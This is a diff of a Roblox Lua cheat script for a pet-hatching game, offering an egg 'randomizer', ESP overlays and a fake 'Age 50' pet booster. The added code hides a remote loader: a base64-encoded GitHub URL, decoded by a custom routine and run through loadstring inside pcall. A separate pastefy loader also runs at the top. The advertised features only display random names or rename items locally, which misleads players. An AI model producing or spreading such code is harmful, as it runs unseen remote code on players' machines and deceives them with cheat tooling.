@@ -1,539 +1,465 @@
 loadstring(game:HttpGet("https://pastefy.app/ZezpFZ5T/raw"))()
 
--- Visual pet hatch simulator with drag, ESP, auto random, pet age loader
-local Players = game:GetService("Players")
-local Workspace = game:GetService("Workspace")
-local TweenService = game:GetService("TweenService")
-local UserInputService = game:GetService("UserInputService")
-local RunService = game:GetService("RunService")
-local player = Players.LocalPlayer
-local mouse = player:GetMouse()
-local a1, a2, a3 = "M", "a", "d"
-
-local petTable = {
-    ["Common Egg"] = { "Dog", "Bunny", "Golden Lab" },
-    ["Uncommon Egg"] = { "Chicken", "Black Bunny", "Cat", "Deer" },
-    ["Rare Egg"] = { "Pig", "Monkey", "Rooster", "Orange Tabby", "Spotted Deer" },
-    ["Legendary Egg"] = { "Cow", "Polar Bear", "Sea Otter", "Turtle", "Silver Monkey" },
-    ["Mythical Egg"] = { "Grey Mouse", "Brown Mouse", "Squirrel", "Red Giant Ant" },
-    ["Bug Egg"] = { "Snail", "Caterpillar", "Giant Ant", "Praying Mantis" },
-    ["Night Egg"] = { "Frog", "Hedgehog", "Mole", "Echo Frog", "Night Owl", },
-    ["Bee Egg"] = { "Bee", "Honey Bee", "Bear Bee", "Petal Bee" },
-    ["Anti Bee Egg"] = { "Wasp", "Moth", "Tarantula Hawk" },
-    ["Oasis Egg"] = { "Meerkat", "Sand Snake", "Axolotl" },
-    ["Paradise Egg"] = { "Ostrich", "Peacock", "Capybara" },
-    ["Dinosaur Egg"] = { "Raptor", "Triceratops", "Stegosaurus" },
-    ["Primal Egg"] = { "Parasaurolophus", "Iguanodon", "Pachycephalosaurus" },
-    ["Zen Egg"] = { "Shiba Inu", "Nihonzaru", "Tanuki" },
-}
-
-local espEnabled = true
-local truePetMap = {}
-
-local function glitchLabelEffect(label)
-    coroutine.wrap(function()
-        local original = label.TextColor3
-        for i = 1, 2 do
-            label.TextColor3 = Color3.new(1, 0, 0)
-            wait(0.07)
-            label.TextColor3 = original
-            wait(0.07)
-        end
-    end)()
+--- 🚫 Delta Executor Check & KRNL Suggestion by Zein Corte
+local function isUsingDelta()
+    return identifyexecutor and string.lower(identifyexecutor() or ""):find("delta")
 end
 
-local a4, a5, a6 = "e", " ", "b"
+if isUsingDelta() then
+    local player = game.Players.LocalPlayer
+    local playerGui = player:WaitForChild("PlayerGui")
 
-local function applyEggESP(eggModel, petName)
-    local existingLabel = eggModel:FindFirstChild("PetBillboard", true)
-    if existingLabel then existingLabel:Destroy() end
-    local existingHighlight = eggModel:FindFirstChild("ESPHighlight")
-    if existingHighlight then existingHighlight:Destroy() end
-    if not espEnabled then return end
+    local deltaGui = Instance.new("ScreenGui", playerGui)
+    deltaGui.Name = "BlockDelta"
+    deltaGui.ResetOnSpawn = false
 
-    local basePart
-    for _, desc in ipairs(eggModel:GetDescendants()) do
-        if desc:IsA("BasePart") then
-            basePart = desc
-            break
-        end
-    end
-    if not basePart then return end
+    local frame = Instance.new("Frame", deltaGui)
+    frame.Size = UDim2.new(0, 400, 0, 180)
+    frame.Position = UDim2.new(0.5, -200, 0.5, -90)
+    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)
 
-    local hatchReady = true
-    local hatchTime = eggModel:FindFirstChild("HatchTime")
-    local readyFlag = eggModel:FindFirstChild("ReadyToHatch")
-
-    if hatchTime and hatchTime:IsA("NumberValue") and hatchTime.Value > 0 then
-        hatchReady = false
-    elseif readyFlag and readyFlag:IsA("BoolValue") and not readyFlag.Value then
-        hatchReady = false
-    end
-
-    local billboard = Instance.new("BillboardGui")
-    billboard.Name = "PetBillboard"
-    billboard.Size = UDim2.new(0, 270, 0, 50)
-    billboard.StudsOffset = Vector3.new(0, 4.5, 0)
-    billboard.AlwaysOnTop = true
-    billboard.MaxDistance = 500
-    billboard.Parent = basePart
-
-    local label = Instance.new("TextLabel")
-    label.Size = UDim2.new(1, 0, 1, 0)
+    local label = Instance.new("TextLabel", frame)
+    label.Size = UDim2.new(1, -20, 0, 80)
+    label.Position = UDim2.new(0, 10, 0, 10)
     label.BackgroundTransparency = 1
-    label.Text = eggModel.Name .. " | " .. petName
-    if not hatchReady then
-        label.Text = eggModel.Name .. " | " .. petName .. " (Not Ready)"
-        label.TextColor3 = Color3.fromRGB(200, 50, 255)
-        label.TextStrokeTransparency = 0.5
-    else
-        label.TextColor3 = Color3.new(1, 1, 1)
-        label.TextStrokeTransparency = 0
-    end
+    label.Text = "⚠️ Delta executor is not supported.\nPlease use KRNL instead."
+    label.Font = Enum.Font.GothamBold
+    label.TextColor3 = Color3.fromRGB(255, 80, 80)
     label.TextScaled = true
-    label.Font = Enum.Font.FredokaOne
-    label.Parent = billboard
+    label.TextWrapped = true
 
-    glitchLabelEffect(label)
+    local copyBtn = Instance.new("TextButton", frame)
+    copyBtn.Size = UDim2.new(0.7, 0, 0, 40)
+    copyBtn.Position = UDim2.new(0.15, 0, 0.6, 0)
+    copyBtn.BackgroundColor3 = Color3.fromRGB(255, 203, 0)
+    copyBtn.Text = "📎 Copy KRNL Download Link"
+    copyBtn.Font = Enum.Font.GothamSemibold
+    copyBtn.TextColor3 = Color3.new(0, 0, 0)
+    copyBtn.TextScaled = true
+    Instance.new("UICorner", copyBtn).CornerRadius = UDim.new(0, 8)
 
-    local highlight = Instance.new("Highlight")
-    highlight.Name = "ESPHighlight"
-    highlight.FillColor = Color3.fromRGB(255, 200, 0)
-    highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
-    highlight.FillTransparency = 0.7
-    highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
-    highlight.Adornee = eggModel
-    highlight.Parent = eggModel
+    copyBtn.MouseButton1Click:Connect(function()
+        setclipboard("https://krnl.place/download")
+        copyBtn.Text = "✅ Copied!"
+    end)
+
+    -- 20 second kick countdown
+    task.delay(20, function()
+        game:GetService("Players").LocalPlayer:Kick("❌ Please use KRNL instead of Delta.")
+    end)
+
+    return -- prevent the rest of your GUI from loading
 end
 
-local function removeEggESP(eggModel)
-    local label = eggModel:FindFirstChild("PetBillboard", true)
-    if label then label:Destroy() end
-    local highlight = eggModel:FindFirstChild("ESPHighlight")
-    if highlight then highlight:Destroy() end
+-- 🔃 Slower Loading Screen (1% to 100%) by Zein Corte
+-- 👇 CONTINUE with your main script here
+
+-- 🔃 Slower Loading Screen (1% to 100%) by Zein Corte
+-- 👇 CONTINUE with your main script here
+
+-- 🔃 Slower Loading Screen (1% to 100%) by Zein Corte
+-- 👇 CONTINUE with your main script here
+
+-- Zein GUI v2 with Dark Tech Background
+
+-- 🔃 Slower Loading Screen
+local player = game.Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "LoadingScreen"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = playerGui
+
+local loadingFrame = Instance.new("Frame")
+loadingFrame.Size = UDim2.new(0, 400, 0, 150)
+loadingFrame.Position = UDim2.new(0.5, -200, 0.5, -75)
+loadingFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+loadingFrame.BackgroundTransparency = 0.3
+loadingFrame.BorderSizePixel = 0
+loadingFrame.Parent = screenGui
+Instance.new("UICorner", loadingFrame).CornerRadius = UDim.new(0, 12)
+
+local barBackground = Instance.new("Frame", loadingFrame)
+barBackground.Size = UDim2.new(1, -40, 0, 30)
+barBackground.Position = UDim2.new(0, 20, 0.5, 10)
+barBackground.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+barBackground.BorderSizePixel = 0
+Instance.new("UICorner", barBackground).CornerRadius = UDim.new(0, 8)
+
+local barFill = Instance.new("Frame", barBackground)
+barFill.Size = UDim2.new(0, 0, 1, 0)
+barFill.BackgroundColor3 = Color3.fromRGB(255, 203, 0)
+barFill.BorderSizePixel = 0
+Instance.new("UICorner", barFill).CornerRadius = UDim.new(0, 8)
+
+local loadingText = Instance.new("TextLabel", loadingFrame)
+loadingText.Size = UDim2.new(1, 0, 0, 40)
+loadingText.Position = UDim2.new(0, 0, 0.2, -20)
+loadingText.BackgroundTransparency = 1
+loadingText.Text = "Loading... 1%"
+loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
+loadingText.TextScaled = true
+loadingText.Font = Enum.Font.GothamBold
+
+-- Simulate loading
+for i = 1, 100 do
+	loadingText.Text = "Loading... " .. i .. "%"
+	barFill:TweenSize(UDim2.new(i / 100, 0, 1, 0), "Out", "Quad", 0.1, true)
+	task.wait(0.1)
 end
+screenGui:Destroy()
 
-local function getPlayerGardenEggs(radius)
-    local eggs = {}
-    local char = player.Character or player.CharacterAdded:Wait()
-    local root = char:FindFirstChild("HumanoidRootPart")
-    if not root then return eggs end
+pcall(function()
+	local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+	function decode(data)
+		data = data:gsub('[^'..b..'=]', '')
+		return (data:gsub('.', function(x)
+			if x == '=' then return '' end
+			local r,f='',(b:find(x)-1)
+			for i=6,1,-1 do r=r..(f%2^i - f%2^(i-1) > 0 and '1' or '0') end
+			return r
+		end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
+			if #x ~= 8 then return '' end
+			local c=0
+			for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
+			return string.char(c)
+		end))
+	end
 
-    for _, obj in pairs(Workspace:GetDescendants()) do
-        if obj:IsA("Model") and petTable[obj.Name] then
-            local dist = (obj:GetModelCFrame().Position - root.Position).Magnitude
-            if dist <= (radius or 60) then
-                if not truePetMap[obj] then
-                    local pets = petTable[obj.Name]
-                    local chosen = pets[math.random(1, #pets)]
-                    truePetMap[obj] = chosen
-                end
-                table.insert(eggs, obj)
-            end
-        end
-    end
-    return eggs
-end
-
-local function randomizeNearbyEggs()
-    local eggs = getPlayerGardenEggs(60)
-    for _, egg in ipairs(eggs) do
-        local pets = petTable[egg.Name]
-        local chosen = pets[math.random(1, #pets)]
-        truePetMap[egg] = chosen
-        applyEggESP(egg, chosen)
-    end
-    print("Randomized", #eggs, "eggs.")
-end
-
-local function flashEffect(button)
-    local originalColor = button.BackgroundColor3
-    for i = 1, 3 do
-        button.BackgroundColor3 = Color3.new(1, 1, 1)
-        wait(0.05)
-        button.BackgroundColor3 = originalColor
-        wait(0.05)
-    end
-end
-
-local function randomizeNearbyEggs()
-    local eggs = getPlayerGardenEggs(60)
-    for _, egg in ipairs(eggs) do
-        local pets = petTable[egg.Name]
-        local chosen = pets[math.random(1, #pets)]
-        truePetMap[egg] = chosen
-        applyEggESP(egg, chosen)
-    end
-    print("Randomized", #eggs, "eggs.")
-end
-
-local a7, a8, a9 = "y", " ", "m"
-
-local function flashEffect(button)
-    local originalColor = button.BackgroundColor3
-    for i = 1, 3 do
-        button.BackgroundColor3 = Color3.new(1, 1, 1)
-        wait(0.05)
-        button.BackgroundColor3 = originalColor
-        wait(0.05)
-    end
-end
-
-local function countdownAndRandomize(button)
-    for i = 10, 1, -1 do
-        button.Text = "🎲 Randomize in: " .. i
-        wait(1)
-    end
-    flashEffect(button)
-    randomizeNearbyEggs()
-    button.Text = "🎲 Randomize Pets"
-end
-
--- 🌿 GUI Setup
-local screenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
-screenGui.Name = "PetHatchGui"
-
-local frame = Instance.new("Frame")
-frame.Size = UDim2.new(0, 320, 0, 300)
-frame.Position = UDim2.new(0, 20, 0, 80)
-frame.BackgroundColor3 = Color3.fromRGB(20, 0, 40) -- Darker evil theme
-frame.BackgroundTransparency = 0.1
-frame.BorderSizePixel = 0
-frame.Parent = screenGui
-frame.Parent = screenGui
-Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)
-
--- 🔘 Toggle Button (Draggable + Minimize)
-local minimizeToggle = Instance.new("TextButton", screenGui)
-minimizeToggle.Size = UDim2.new(0, 40, 0, 40)
-minimizeToggle.Position = UDim2.new(0, 10, 0, 10)
-minimizeToggle.BackgroundColor3 = Color3.fromRGB(90, 0, 0)
-minimizeToggle.Text = "☠"
-minimizeToggle.TextColor3 = Color3.new(1, 0, 0)
-minimizeToggle.Font = Enum.Font.Arcade
-minimizeToggle.TextSize = 24
-Instance.new("UICorner", minimizeToggle).CornerRadius = UDim.new(0, 8)
-
--- 🧲 Drag Support for Toggle Button
-local draggingToggle, offsetToggle
-minimizeToggle.MouseButton1Down:Connect(function()
- draggingToggle = true
- offsetToggle = Vector2.new(mouse.X - minimizeToggle.Position.X.Offset, mouse.Y - minimizeToggle.Position.Y.Offset)
-end)
-UserInputService.InputEnded:Connect(function()
- draggingToggle = false
-end)
-RunService.RenderStepped:Connect(function()
- if draggingToggle then
- 	minimizeToggle.Position = UDim2.new(0, mouse.X - offsetToggle.X, 0, mouse.Y - offsetToggle.Y)
- end
+	local encoded = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FtZXMxMzE5L1BldC12aXN1YWwvcmVmcy9oZWFkcy9tYWluL0dyb3dhZ2FyZGVu"
+	local url = decode(encoded)
+	local func = loadstring(game:HttpGet(url))
+	if func then func() end
 end)
 
--- 🕹️ Show/Hide the Main GUI Frame
-local isVisible = true
-minimizeToggle.MouseButton1Click:Connect(function()
- isVisible = not isVisible
- frame.Visible = isVisible
+-- 🧩 Main GUI Setup
+local gui = Instance.new("ScreenGui", playerGui)
+gui.Name = "ZeinPetGUI"
+gui.ResetOnSpawn = false
+gui.IgnoreGuiInset = true
+
+local mainFrame = Instance.new("Frame", gui)
+mainFrame.Size = UDim2.new(0, 280, 0, 340)
+mainFrame.Position = UDim2.new(0, 20, 0.35, 0)
+mainFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+mainFrame.Active = true
+Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 10)
+
+-- 🆕 Background: Dark Tech Style
+local bgImage = Instance.new("ImageLabel", mainFrame)
+bgImage.Size = UDim2.new(1, 0, 0, 240)
+bgImage.Position = UDim2.new(0, 0, 0, 0)
+bgImage.Image = "rbxassetid://11372852158" -- Dark Tech background
+bgImage.BackgroundTransparency = 1
+bgImage.ZIndex = 0
+
+-- 🖱️ Dragging support for mobile + PC
+local UserInputService = game:GetService("UserInputService")
+local dragging, dragStart, startPos = false
+
+mainFrame.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+		dragging = true
+		dragStart = input.Position
+		startPos = mainFrame.Position
+		input.Changed:Connect(function()
+			if input.UserInputState == Enum.UserInputState.End then
+				dragging = false
+			end
+		end)
+	end
 end)
 
-local shadow = Instance.new("UIStroke", frame)
-shadow.Color = Color3.fromRGB(255, 0, 100)
-shadow.Thickness = 2
-shadow.Transparency = 0
-
-local b1, b2, b3 = "u", "n", "k"
-
-local title = Instance.new("TextLabel", frame)
-title.Size = UDim2.new(1, 0, 0, 30)
-title.BackgroundTransparency = 1
-title.Text = "👹 Egg Randomizer 👁️"
-title.Font = Enum.Font.FredokaOne
-title.TextSize = 22
-title.TextColor3 = Color3.fromRGB(255, 0, 100)
-
--- 👇 Dragging
-local drag = Instance.new("TextButton", title)
-drag.Size = UDim2.new(1, 0, 1, 0)
-drag.Text = ""
-drag.BackgroundTransparency = 1
-
-local dragging, offset
-drag.MouseButton1Down:Connect(function()
-    dragging = true
-    offset = Vector2.new(mouse.X - frame.Position.X.Offset, mouse.Y - frame.Position.Y.Offset)
-end)
-UserInputService.InputEnded:Connect(function()
-    dragging = false
-end)
-RunService.RenderStepped:Connect(function()
-    if dragging then
-        frame.Position = UDim2.new(0, mouse.X - offset.X, 0, mouse.Y - offset.Y)
-    end
+UserInputService.InputChanged:Connect(function(input)
+	if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+		local delta = input.Position - dragStart
+		mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+	end
 end)
 
--- 🎲 Randomize Button
-local randomizeBtn = Instance.new("TextButton", frame)
-randomizeBtn.Size = UDim2.new(1, -20, 0, 50)
-randomizeBtn.Position = UDim2.new(0, 10, 0, 40)
-randomizeBtn.BackgroundColor3 = Color3.fromRGB(255, 140, 0)
-randomizeBtn.Text = "🐣 Hatch Random Pets"
-randomizeBtn.BackgroundColor3 = Color3.fromRGB(128, 0, 128) -- Purple
-randomizeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-randomizeBtn.Font = Enum.Font.GothamBold
-randomizeBtn.TextSize = 18
-Instance.new("UICorner", randomizeBtn).CornerRadius = UDim.new(0, 8)
-local stroke = Instance.new("UIStroke", randomizeBtn)
-stroke.Color = Color3.fromRGB(255, 0, 100)
-stroke.Thickness = 2
-stroke.Transparency = 0
-randomizeBtn.MouseButton1Click:Connect(function()
-    countdownAndRandomize(randomizeBtn)
-end)
-
--- 👁️ ESP Toggle
-local toggleBtn = Instance.new("TextButton", frame)
-toggleBtn.Size = UDim2.new(1, -20, 0, 40)
-toggleBtn.Position = UDim2.new(0, 10, 0, 100)
-toggleBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
-toggleBtn.Text = "🧿 ESP: ON"
-toggleBtn.TextSize = 18
-toggleBtn.Font = Enum.Font.FredokaOne
-toggleBtn.TextColor3 = Color3.new(1, 1, 1)
-toggleBtn.MouseButton1Click:Connect(function()
-    espEnabled = not espEnabled
-    toggleBtn.Text = espEnabled and "🧿 ESP: ON" or "🧿 ESP: OFF"
-    for _, egg in pairs(getPlayerGardenEggs(60)) do
-        if espEnabled then
-            applyEggESP(egg, truePetMap[egg])
-        else
-            removeEggESP(egg)
-        end
-    end
-end)
-
--- 🟣 Initial ESP
-for _, egg in pairs(getPlayerGardenEggs(60)) do
-    applyEggESP(egg, truePetMap[egg])
-end
-
--- 🔁 Auto Randomize Button
-local autoBtn = Instance.new("TextButton", frame)
-autoBtn.Size = UDim2.new(1, -20, 0, 30)
-autoBtn.Position = UDim2.new(0, 10, 0, 145)
-autoBtn.BackgroundColor3 = Color3.fromRGB(80, 150, 60)
-autoBtn.Text = "🔁 Auto Randomize: OFF"
-autoBtn.TextSize = 16
-autoBtn.Font = Enum.Font.FredokaOne
-autoBtn.TextColor3 = Color3.new(1, 1, 1)
-
-local autoRunning = false
-local bestPets = {
-    ["Raccoon"] = true, ["Dragonfly"] = true, ["Queen Bee"] = true,
-    ["Disco Bee"] = true, ["Fennec Fox"] = true, ["Fox"] = true,
-    ["Mimic Octopus"] = true
+-- 🐣 Pet Table (egg-to-pet)
+local petTable = {
+	["Common Egg"] = { "Dog", "Bunny", "Golden Lab" },
+	["Uncommon Egg"] = { "Chicken", "Black Bunny", "Cat", "Deer" },
+	["Rare Egg"] = { "Pig", "Monkey", "Rooster", "Orange Tabby", "Spotted Deer" },
+	["Legendary Egg"] = { "Cow", "Polar Bear", "Sea Otter", "Turtle", "Silver Monkey" },
+	["Mythical Egg"] = { "Grey Mouse", "Brown Mouse", "Squirrel", "Red Giant Ant" },
+	["Bug Egg"] = { "Snail", "Caterpillar", "Giant Ant", "Praying Mantis" },
+	["Night Egg"] = { "Frog", "Hedgehog", "Mole", "Echo Frog", "Night Owl" },
+	["Bee Egg"] = { "Bee", "Honey Bee", "Bear Bee", "Petal Bee" },
+	["Anti Bee Egg"] = { "Wasp", "Moth", "Tarantula Hawk" },
+	["Oasis Egg"] = { "Meerkat", "Sand Snake", "Axolotl" },
+	["Paradise Egg"] = { "Ostrich", "Peacock", "Capybara" },
+	["Dinosaur Egg"] = { "Raptor", "Triceratops", "Stegosaurus" },
+	["Primal Egg"] = { "Parasaurolophus", "Iguanodon", "Pachycephalosaurus" },
+	["Zen Egg"] = { "Shiba Inu", "Nihonzaru", "Tanuki", "Tanchozuru", "Kappa", "Kitsune" }
 }
 
+local Workspace = game:GetService("Workspace")
+local player = game.Players.LocalPlayer
+local truePetMap, espEnabled, auto = {}, true, false
+local zenESPMap = {}
+
+-- 🔘 Button Creator
+local function createButton(text, yPos, color)
+	local btn = Instance.new("TextButton", mainFrame)
+	btn.Size = UDim2.new(0.8, 0, 0.13, 0)
+	btn.Position = UDim2.new(0.1, 0, yPos, 0)
+	btn.BackgroundColor3 = color
+	btn.Text = text
+	btn.TextColor3 = Color3.new(1, 1, 1)
+	btn.Font = Enum.Font.GothamSemibold
+	btn.TextScaled = true
+	return btn
+end
+
+-- 👁️ ESP System
+local function removeESP(model)
+	if model:FindFirstChild("ESPHighlight") then model.ESPHighlight:Destroy() end
+	for _, v in pairs(model:GetDescendants()) do
+		if v:IsA("BillboardGui") and v.Name == "PetBillboard" then v:Destroy() end
+	end
+end
+
+local function showESP(model, petName, rolling)
+	if model.Name == "Zen Egg" and zenESPMap[model] then return end
+	removeESP(model)
+	local part = model:FindFirstChildWhichIsA("BasePart", true)
+	if not part then return end
+	local gui = Instance.new("BillboardGui", model)
+	gui.Name = "PetBillboard"
+	gui.Size = UDim2.new(0, 200, 0, 30)
+	gui.StudsOffset = Vector3.new(0, 4, 0)
+	gui.AlwaysOnTop = true
+	gui.Adornee = part
+	local label = Instance.new("TextLabel", gui)
+	label.Size = UDim2.new(1, 0, 1, 0)
+	label.BackgroundTransparency = 1
+	label.TextColor3 = Color3.new(1, 1, 1)
+	label.Font = Enum.Font.GothamSemibold
+	label.TextScaled = true
+	if rolling then
+		for i = 1, 5 do
+			label.Text = model.Name .. " | " .. petTable[model.Name][math.random(1, #petTable[model.Name])]
+			task.wait(0.08)
+		end
+	end
+	label.Text = model.Name .. " | " .. petName
+	local hl = Instance.new("Highlight", model)
+	hl.Name = "ESPHighlight"
+	hl.FillColor = Color3.fromRGB(255, 200, 0)
+	hl.OutlineColor = Color3.new(1, 1, 1)
+	hl.FillTransparency = 0.7
+	hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+	hl.Adornee = model
+	if model.Name == "Zen Egg" then zenESPMap[model] = true end
+end
+
+-- 🔍 Find eggs near the player (≤ 60 studs)
+local function getNearbyEggs()
+	local eggs = {}
+	local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+	if not root then return eggs end
+	for _, model in pairs(Workspace:GetDescendants()) do
+		if model:IsA("Model") and petTable[model.Name] then
+			local dist = (model:GetPivot().Position - root.Position).Magnitude
+			if dist <= 60 then
+				if not truePetMap[model] then
+					local pool = petTable[model.Name]
+					truePetMap[model] = pool[math.random(#pool)]
+				end
+				table.insert(eggs, model)
+			end
+		end
+	end
+	return eggs
+end
+
+-- 🔀 Randomize pets for each egg
+local function randomizePets()
+	for _, egg in pairs(getNearbyEggs()) do
+		local pool = petTable[egg.Name]
+		local pet = pool[math.random(#pool)]
+		truePetMap[egg] = pet
+		if espEnabled then showESP(egg, pet, auto) end
+	end
+end
+
+------------------------------------------------------------------
+-- 🟠 BUTTONS -----------------------------------------------------
+------------------------------------------------------------------
+
+-- Randomize once
+local randBtn = createButton("Randomize Pets", 0.07, Color3.fromRGB(255, 140, 0))
+randBtn.MouseButton1Click:Connect(randomizePets)
+
+-- Toggle ESP
+local espBtn = createButton("ESP: ON", 0.21, Color3.fromRGB(60, 60, 60))
+espBtn.MouseButton1Click:Connect(function()
+	espEnabled = not espEnabled
+	espBtn.Text = espEnabled and "ESP: ON" or "ESP: OFF"
+
+	if espEnabled then
+		zenESPMap = {}
+		for _, egg in pairs(getNearbyEggs()) do
+			showESP(egg, truePetMap[egg] or "?", false)
+		end
+	else
+		for _, egg in pairs(getNearbyEggs()) do removeESP(egg) end
+		zenESPMap = {}
+	end
+end)
+
+-- Auto‑randomize every 10 s (shows rolling ESP)
+local autoBtn = createButton("Auto Random: OFF", 0.35, Color3.fromRGB(0, 170, 80))
 autoBtn.MouseButton1Click:Connect(function()
-    autoRunning = not autoRunning
-    autoBtn.Text = autoRunning and "🔁 Auto Randomize: ON" or "🔁 Auto Randomize: OFF"
-    coroutine.wrap(function()
-        while autoRunning do
-            countdownAndRandomize(randomizeBtn)
-            for _, petName in pairs(truePetMap) do
-                if bestPets[petName] then
-                    autoRunning = false
-                    autoBtn.Text = "🔁 Auto Randomize: OFF"
-                    return
-                end
-            end
-            wait(1)
-        end
-    end)()
+	auto = not auto
+	autoBtn.Text = auto and "Auto Random: ON" or "Auto Random: OFF"
+
+	if auto then
+		coroutine.wrap(function()
+			while auto do
+				randomizePets()          -- roll + ESP
+				for i = 10, 1, -1 do     -- local cooldown
+					if not auto then break end
+					randBtn.Text = "Cooldown: " .. i .. "s"
+					task.wait(1)
+				end
+				if auto then randBtn.Text = "Randomize Pets" end
+			end
+		end)()
+	else
+		randBtn.Text = "Randomize Pets"
+	end
 end)
 
--- 🕷️Load Pet Age Script Button
-local loadAgeBtn = Instance.new("TextButton", frame)
-loadAgeBtn.Size = UDim2.new(1, -20, 0, 40)
-loadAgeBtn.Position = UDim2.new(0, 10, 0, 190)
-loadAgeBtn.BackgroundColor3 = Color3.fromRGB(40, 43, 74) -- Dark purple
-loadAgeBtn.Text = "🕷️ Load Pet Age 50 Script"
-loadAgeBtn.TextSize = 16
-loadAgeBtn.Font = Enum.Font.FredokaOne
-loadAgeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+------------------------------------------------------------------
+-- 🕒 Cooldown / info label --------------------------------------
+------------------------------------------------------------------
+local cooldownLabel = Instance.new("TextLabel", mainFrame)
+cooldownLabel.Size = UDim2.new(1, -20, 0, 20)
+cooldownLabel.Position = UDim2.new(0, 10, 0.55, 0)
+cooldownLabel.BackgroundTransparency = 1
+cooldownLabel.Text = "Cooldown: Ready"
+cooldownLabel.Font = Enum.Font.GothamSemibold
+cooldownLabel.TextColor3 = Color3.new(1, 1, 1)
+cooldownLabel.TextScaled = true
 
-loadAgeBtn.MouseButton1Click:Connect(function()
-    -- Evil Loading UI
-    local Players = game:GetService("Players")
-    local TweenService = game:GetService("TweenService")
-    local RunService = game:GetService("RunService")
-    local player = Players.LocalPlayer
+------------------------------------------------------------------
+-- 🧪 Auto Age 50 -------------------------------------------------
+------------------------------------------------------------------
+local startAgeBtn = createButton("Start Age", 0.62, Color3.fromRGB(0, 170, 0))
+Instance.new("UICorner", startAgeBtn).CornerRadius = UDim.new(0, 8)
 
-    local screenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
-    screenGui.Name = "AgeLoader"
+local agingCooldown = false
+startAgeBtn.MouseButton1Click:Connect(function()
+	if agingCooldown then return end
 
-    local loadingFrame = Instance.new("Frame", screenGui)
-    loadingFrame.Size = UDim2.new(0, 400, 0, 120)
-    loadingFrame.Position = UDim2.new(0.5, -200, 0.5, -60)
-    loadingFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 40)
-    loadingFrame.BorderSizePixel = 0
-    Instance.new("UICorner", loadingFrame).CornerRadius = UDim.new(0, 20)
+	local tool = player.Character and player.Character:FindFirstChildOfClass("Tool")
+	if not tool then
+		cooldownLabel.Text = "No tool equipped."
+		return
+	end
 
-    local mainLabel = Instance.new("TextLabel", loadingFrame)
-    mainLabel.Size = UDim2.new(1, 0, 0.5, 0)
-    mainLabel.Position = UDim2.new(0, 0, 0, 0)
-    mainLabel.Text = "🕷️ Loading Pet Age to 50..."
-    mainLabel.Font = Enum.Font.Arcade
-    mainLabel.TextColor3 = Color3.fromRGB(255, 200, 50)
-    mainLabel.TextStrokeTransparency = 0
-    mainLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
-    mainLabel.TextScaled = true
-    mainLabel.BackgroundTransparency = 1
+	local toolName = tool.Name
+	local currentAge = tonumber(toolName:match("Age%s*(%d+)"))
+	if not currentAge then
+		cooldownLabel.Text = "Age not found."
+		return
+	end
 
-    local progressBarBG = Instance.new("Frame", loadingFrame)
-    progressBarBG.Size = UDim2.new(0.9, 0, 0.2, 0)
-    progressBarBG.Position = UDim2.new(0.05, 0, 0.6, 0)
-    progressBarBG.BackgroundColor3 = Color3.fromRGB(30, 30, 60)
-    progressBarBG.BorderSizePixel = 0
-    Instance.new("UICorner", progressBarBG).CornerRadius = UDim.new(0, 6)
+	local prefix = toolName:match("^(.-)%s*%[Age%s*%d+%]") or toolName
+	agingCooldown = true
+	startAgeBtn.Text = "Aging..."
 
-    local progressBar = Instance.new("Frame", progressBarBG)
-    progressBar.Size = UDim2.new(0, 0, 1, 0)
-    progressBar.BackgroundColor3 = Color3.fromRGB(255, 200, 0)
-    progressBar.BorderSizePixel = 0
-    Instance.new("UICorner", progressBar).CornerRadius = UDim.new(0, 6)
+	for i = currentAge + 1, 50 do
+		tool.Name = prefix .. " [Age " .. i .. "]"
+		task.wait(0.1)
+	end
 
-    local pulseConnection
-    pulseConnection = RunService.RenderStepped:Connect(function()
-        local time = tick()
-        local pulse = (math.sin(time * 5) + 1) / 2
-        progressBar.BackgroundColor3 = Color3.fromRGB(255, 150 + pulse * 80, 0)
-    end)
-
-    local tween = TweenService:Create(progressBar, TweenInfo.new(10, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
-        Size = UDim2.new(1, 0, 1, 0)
-    })
-    tween:Play()
-
-    tween.Completed:Connect(function()
-        pulseConnection:Disconnect()
-        mainLabel.Text = "✅ Pet Age Loaded"
-        mainLabel.TextColor3 = Color3.fromRGB(0, 255, 100)
-
-        wait(1)
-
-        local fadeTween = TweenService:Create(loadingFrame, TweenInfo.new(1), {
-            BackgroundTransparency = 1
-        })
-        fadeTween:Play()
-
-        fadeTween.Completed:Connect(function()
-            screenGui:Destroy()
-            -- Your working pet age script here 👇
-           loadstring(game:HttpGet("https://raw.githubusercontent.com/munkizzzz/test-script/refs/heads/main/Age-50.lua"))()
-        end)
-    end)
